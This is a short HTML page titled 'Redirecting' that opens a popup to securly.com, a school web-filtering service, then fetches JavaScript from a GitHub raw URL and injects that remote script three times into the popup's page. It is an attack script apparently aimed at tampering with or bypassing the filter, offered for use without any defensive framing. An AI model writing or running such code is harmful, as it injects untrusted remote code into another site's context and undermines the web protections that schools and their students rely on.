<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting</title>
    <script>
        // Wait for the page to load
        window.addEventListener('load', () => {
            const redirectUrl = 'https://securly.com';
            const scriptUrl = 'https://raw.githubusercontent.com/Dy1ngRat/pupet/refs/heads/main/action.js';

            // Open a new about:blank window
            const newWindow = window.open('about:blank', '_blank', 'width=500,height=300');

            // Redirect to the new URL and track it
            newWindow.location.href = redirectUrl;

            // Listen for the 'load' event after redirection
            newWindow.addEventListener('load', () => {
                setTimeout(() => {
                    fetch(scriptUrl)
                        .then(response => response.text())
                        .then(scriptContent => {
                            for (let i = 0; i < 3; i++) {
                                const scriptElement = newWindow.document.createElement('script');
                                scriptElement.textContent = scriptContent;
                                newWindow.document.body.appendChild(scriptElement);
                            }
                        })
                        .catch(error => console.error('Error loading script:', error));
                }, 1000); // 1 second delay
            });
        });
    </script>
</head>
<body>
    <h1>Redirecting...</h1>
</body>
</html>
